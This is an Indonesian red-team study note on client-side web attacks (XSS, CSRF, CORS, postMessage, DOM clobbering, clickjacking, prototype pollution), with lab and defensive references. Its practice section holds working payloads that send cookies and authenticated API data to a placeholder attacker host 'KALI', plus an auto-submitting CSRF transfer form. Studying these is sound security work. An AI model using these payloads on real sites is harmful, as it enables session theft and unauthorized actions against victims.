# 🖥️🎯 Client-Side Attacks

> [!summary] Ringkasan
> Jika [[Web Exploitation Lanjutan]] fokus pada bug **server-side**, note ini melengkapi sisi **client-side** — serangan yang dieksekusi di **browser korban**: **XSS lanjutan** (DOM/stored/blind, CSP bypass), **CSRF**, **CORS misconfig**, **postMessage abuse**, **DOM clobbering**, **clickjacking**, dan **prototype pollution sisi klien**. Tujuannya: mencuri sesi, melakukan aksi atas nama korban, atau menjangkau API internal lewat browser mereka.

**Bagian dari:** [[Red Team (MOC)]]
**Prasyarat:** [[Web Application Hacking (OWASP Top 10)]], [[Jaringan Komputer]]

> [!note] Kapan ini relevan
> Setelah paham XSS/CSRF dasar di OWASP Top 10. Serangan client-side bergantung pada **konteks browser** (Same-Origin Policy, cookie, DOM) — paham model keamanan browser adalah kuncinya.

---

## 🧠 Konsep Inti

### 1. XSS lanjutan
Menyuntik JavaScript yang jalan di browser korban.
- **Reflected** — payload di URL, dipantulkan langsung.
- **Stored** — payload tersimpan di server (komentar/profil) → kena semua pengunjung (paling berbahaya).
- **DOM-based** — kerentanan murni di JS klien (`innerHTML`, `document.write`, `location.hash`) tanpa server terlibat.
- **Blind XSS** — payload tereksekusi di tempat lain (mis. panel admin) → konfirmasi out-of-band (XSS Hunter).
- **CSP bypass** — Content-Security-Policy yang longgar (`unsafe-inline`, domain JSONP/Angular whitelisted, `nonce` bocor) tetap bisa ditembus.
Dampak: curi cookie/token, keylog, **BeEF hook** (kendalikan browser), pivot ke API internal.

### 2. CSRF (Cross-Site Request Forgery)
Paksa browser korban (yang sudah login) mengirim request berbahaya. Berhasil jika app hanya andalkan cookie tanpa **anti-CSRF token** / **SameSite**.
```html
<form action="https://bank/transfer" method="POST" id="x">
  <input name="to" value="attacker"><input name="amount" value="1000">
</form><script>document.getElementById('x').submit()</script>
```

### 3. CORS misconfig
Header CORS salah → situs jahat bisa baca respons sensitif lintas-origin.
- `Access-Control-Allow-Origin` memantulkan **Origin apa pun** + `Allow-Credentials: true` = bocor data terautentikasi.
- Trust `null` origin / regex domain longgar (`evil-bank.com` cocok `bank.com`).

### 4. postMessage abuse
Komunikasi antar-window/iframe via `postMessage`. Bug: penerima tak memvalidasi `event.origin` → kirim pesan jahat; atau pengirim pakai `targetOrigin: "*"` → bocor data ke origin lain.

### 5. DOM clobbering
Tanpa JS sama sekali: HTML injection (`<a id=x>`) menimpa variabel global/`window.x` → ubah alur skрипт yang tak hati-hati (bypass sanitizer/feature flag).

### 6. Clickjacking
Bingkai situs korban dalam iframe transparan → korban mengira klik tombol lain padahal klik aksi sensitif. Cegah dgn `X-Frame-Options`/`frame-ancestors`.

### 7. Prototype pollution (klien)
Cemari `Object.prototype` lewat `__proto__` di parsing JSON/query → ubah perilaku app klien → sering **eskalasi ke DOM XSS** (gadget). (Versi server-side → RCE, lihat [[Web Exploitation Lanjutan]].)

## ⚙️ Praktik

```javascript
// --- XSS: curi cookie / konfirmasi ---
<script>new Image().src='//KALI/c?'+document.cookie</script>
<img src=x onerror="fetch('//KALI/?'+document.cookie)">
// DOM XSS via fragmen URL:  https://site/#<img src=x onerror=alert(1)>

// --- CORS test (jalankan dari origin jahat) ---
fetch('https://target/api/me',{credentials:'include'})
  .then(r=>r.text()).then(d=>fetch('//KALI/?'+btoa(d)));

// --- postMessage: kirim ke handler yg tak cek origin ---
target.postMessage('{"cmd":"setToken","v":"evil"}','*');
```

```bash
# Konfirmasi blind XSS / out-of-band: pakai XSS Hunter / interactsh / Burp Collaborator
```

> [!tip] Burp + browser DevTools
> Pakai **Burp** (Repeater untuk CSRF PoC, Collaborator untuk blind XSS/CORS) dan **DevTools** (telusuri sumber DOM XSS lewat *sources*/breakpoint pada `innerHTML`). Ekstensi **DOM Invader** (Burp) khusus berburu DOM XSS & prototype pollution klien.

## 🧰 Tools

- **Burp Suite** + **DOM Invader** — pusat kerja; lacak DOM XSS & prototype pollution.
- **BeEF** — Browser Exploitation Framework (hook & kendalikan browser korban).
- **XSS Hunter / interactsh** — konfirmasi blind XSS out-of-band.
- **CSP Evaluator** (Google) — nilai kelemahan CSP.
- **Browser DevTools** — debug JS klien & DOM.

## 🔗 Kaitan

- Pelengkap server-side: [[Web Exploitation Lanjutan]]; dasar XSS/CSRF: [[Web Application Hacking (OWASP Top 10)]].
- XSS sering jadi pengiriman ke korban: bersinggungan [[Social Engineering]] & [[Payload Development & Initial Access]] (link berbahaya).
- Curi token → akses API: [[API Hacking (REST-GraphQL)]].
- **Sisi Blue ↔** [[Log Analysis & Monitoring]] (pola payload XSS/CSRF di log), WAF [[Network Security (Firewall, IDS-IPS)]], pencegahan desain (CSP/SameSite/headers) di [[Hardening & Vulnerability Management]] & [[Threat Modeling]].

## 🎯 Latihan

- **PortSwigger Web Security Academy** — modul *XSS, CSRF, CORS, DOM-based, Clickjacking, Prototype Pollution* (lab gratis tiap topik). https://portswigger.net/web-security
- **Google XSS Game** & **PentesterLab** — XSS bertingkat.
- Tulis PoC CSRF lengkap + rantai DOM XSS → curi sesi di lab.

## 📖 Sumber

- **PortSwigger Web Security Academy** — https://portswigger.net/web-security
- **OWASP — XSS / CSRF / Clickjacking Cheat Sheets** — https://cheatsheetseries.owasp.org
- **PayloadsAllTheThings — XSS / CORS / CSRF** — https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks — XSS / CORS / postMessage** — https://book.hacktricks.xyz
